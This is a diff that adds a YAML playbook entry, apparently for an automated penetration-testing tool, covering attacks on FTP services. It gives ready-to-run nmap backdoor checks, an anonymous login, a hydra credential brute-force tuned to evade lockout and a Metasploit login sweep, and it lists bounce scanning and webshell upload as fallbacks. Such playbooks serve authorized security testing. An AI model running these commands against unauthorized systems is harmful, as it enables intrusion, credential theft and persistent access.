@@ -1,0 +1,34 @@
+id: service_ftp_anonymous
+title: "FTP anonymous + bounce + cred attack"
+phase: recon
+mitre: ["T1078.001", "T1110.001"]
+trigger:
+  services: ["ftp", "vsftpd", "proftpd", "pure-ftpd", "ftps"]
+  ports:    [21, 990, 2121]
+  os_any:   ["linux", "windows"]
+keywords: ["ftp", "anonymous ftp", "vsftpd", "proftpd", "ftp bounce", "ftps"]
+preconditions:
+  - "TCP/21 reachable"
+steps:
+  - tool: nmap
+    cmd:  "nmap -sV -p21,990 --script=ftp-anon,ftp-syst,ftp-bounce,ftp-vsftpd-backdoor,ftp-proftpd-backdoor {target}"
+    why:  "Banner + anon login + known backdoors (vsftpd 2.3.4, proftpd 1.3.3c)"
+  - tool: ftp
+    cmd:  "ftp -inv {target} <<< $'user anonymous anonymous@\\nbinary\\nls -la\\nquit'"
+    why:  "Direct anon login if nmap reports 'Anonymous FTP login allowed'"
+  - tool: hydra
+    cmd:  "hydra -L users.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt ftp://{target} -t 4 -f -V"
+    why:  "Cred spray when anon denied — slow on purpose to evade lockout"
+  - tool: msfconsole
+    cmd:  "msfconsole -qx 'use auxiliary/scanner/ftp/anonymous; set RHOSTS {target}; run; use auxiliary/scanner/ftp/ftp_login; set RHOSTS {target}; set USER_FILE users.txt; set PASS_FILE passwords.txt; run'"
+    why:  "Bulk subnet sweep when scanning multiple hosts"
+  - tool: curl
+    cmd:  "curl -s 'ftp://anonymous:anon@{target}/' -l"
+    why:  "Quick anon listing without an interactive client"
+expected_outcome: "Anon login → file listing; cred pair on bruteforce success; backdoor RCE if vsftpd 2.3.4"
+fallbacks:
+  - "FTP bounce attack (PORT cmd) → use FTP server to scan internal hosts when ingress firewalled"
+  - "If write access in pub/ → upload webshell when paired with HTTP same-host"
+  - "Check /etc/passwd-style files in / and pub/ — many appliances leak creds"
+references:
+  - "https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp"
